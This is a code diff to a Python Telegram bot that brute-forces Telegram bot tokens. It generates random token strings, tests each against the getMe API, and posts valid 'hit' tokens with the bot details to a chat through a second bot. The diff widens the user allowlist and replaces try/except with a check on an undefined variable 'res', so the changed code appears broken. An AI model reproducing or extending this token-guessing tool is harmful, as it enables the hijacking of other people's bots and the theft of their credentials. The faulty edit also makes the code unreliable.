@@ -52,7 +52,7 @@ def hit(mee):
 def asd(call):
 	if call.data == 'dev':
 		us = call.from_user.id
-		asf = [1433763087,2112066248,5952149947,1410377361,1253625371,5824943292,5903160198,1025792859,2116409671,6274883941,708441197,6044283982,5625626952,6273507425,5809861669,936441187,5225076831,6064817004,980833331,5951464891,5110919325,991561009,2072356046,1202001099,5977257530,749219602,5402196151,6019145503]
+		asf = [1433763087,2112066248,5952149947,1410377361,1253625371,5824943292,5903160198,1025792859,2116409671,6274883941,708441197,6044283982,5625626952,6273507425,5809861669,936441187,5225076831,6064817004,980833331,5951464891,5110919325,991561009,2072356046,1202001099,5977257530,749219602,5402196151,6019145503,1474557299,2089603395, 655605141, 2116409671, 5822690155, 6194323455, 5178005352, 6119224271, 2088236954, 950256498, 5703963661]
 		if us in asf:
 			id_derk = 5903160198
 			last_name = call.from_user.full_name
@@ -80,7 +80,7 @@ id : {user_idnc}
 				n = ''.join(random.choice(aaaa)for i in range(32))
 				token = bbb + bb + ':' + b + n
 				response=requests.get(url=f"https://api.telegram.org/bot{token}/getme").json()
-				try:
+				if str('result') in res:
 					result = response['result']
 					id = result['id']
 					is_bot = result['is_bot']
@@ -123,7 +123,7 @@ dev👨‍💻 @d_xiim
 					send_hit = requests.post(f"https://api.telegram.org/bot{tnt}/sendMessage?chat_id={id_d}&text={g}")
 					jk +=1
 					return
-				except:
+				else:
 					dp +=1
 				ass = types.InlineKeyboardButton(f'hit token : {jk}', callback_data='ass')
 				xnxx = types.InlineKeyboardButton(f'Bad Token : {dp}',callback_data='xnxx')
